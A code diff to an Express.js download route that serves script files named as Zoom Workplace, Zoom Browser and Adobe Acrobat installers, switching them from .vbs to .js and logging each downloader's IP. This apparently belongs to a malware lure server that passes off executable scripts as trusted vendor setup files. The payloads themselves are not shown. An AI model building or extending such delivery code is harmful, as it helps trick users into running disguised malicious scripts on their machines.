@@ -311,16 +311,16 @@ app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
         let filename;
         switch(type) {
             case 'workplace':
-                filename = 'Zoom_Workplace_Setup.vbs';
+                filename = 'Zoom_Workplace_Setup.js';
                 break;
             case 'browser':
-                filename = 'Zoom_Browser_Setup.vbs';
+                filename = 'Zoom_Browser_Setup.js';
                 break;
             case 'adobe':
-                filename = 'Adobev2T1_Setup.vbs';
+                filename = 'Acrobat_update.js';
                 break;    
             default:
-                filename = 'Zoom_Workplace.vbs';
+                filename = 'Zoom_Workplace.js';
         }
         
         // Set proper download headers with dynamic filename
@@ -329,7 +329,7 @@ app.get('/download/vbs/:type', apiLimiter, async (req, res) => {
         res.setHeader('Content-Length', Buffer.byteLength(data));
 
         log('info', { 
-            event: 'vbs_download', 
+            event: 'js_download', 
             type: type,
             filename: filename,
             ip: getClientIp(req), 
